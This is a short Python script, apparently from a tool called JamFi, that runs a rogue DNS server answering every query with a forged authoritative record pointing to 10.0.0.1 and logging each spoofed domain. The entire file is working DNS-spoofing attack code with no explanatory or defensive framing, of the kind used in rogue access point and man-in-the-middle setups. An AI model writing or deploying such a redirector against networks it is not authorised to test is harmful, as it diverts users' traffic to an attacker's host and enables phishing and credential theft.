#!/usr/bin/env python3

import socket
from dnslib import DNSRecord, DNSHeader, RR, A, QTYPE

spoof_ip = "10.0.0.1"
listen_ip = "0.0.0.0"
listen_port = 53

print(f"🎯 JamFi DNS redirector running on {listen_ip}:{listen_port} → redirecting all to {spoof_ip}")

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.bind((listen_ip, listen_port))

while True:
    try:
        data, addr = sock.recvfrom(512)
        dns_req = DNSRecord.parse(data)

        qname = str(dns_req.q.qname)
        qtype = QTYPE[dns_req.q.qtype]
        print(f"[+] Spoofing DNS for {qname.strip('.')} ({qtype}) → {spoof_ip}")

        dns_reply = DNSRecord(
            DNSHeader(id=dns_req.header.id, qr=1, aa=1, ra=1),
            q=dns_req.q
        )

        dns_reply.add_answer(
            RR(
                rname=dns_req.q.qname,
                rtype=QTYPE.A,
                rclass=1,
                ttl=300,
                rdata=A(spoof_ip)
            )
        )

        sock.sendto(dns_reply.pack(), addr)

    except Exception as e:
        print(f"[-] Error: {e}")
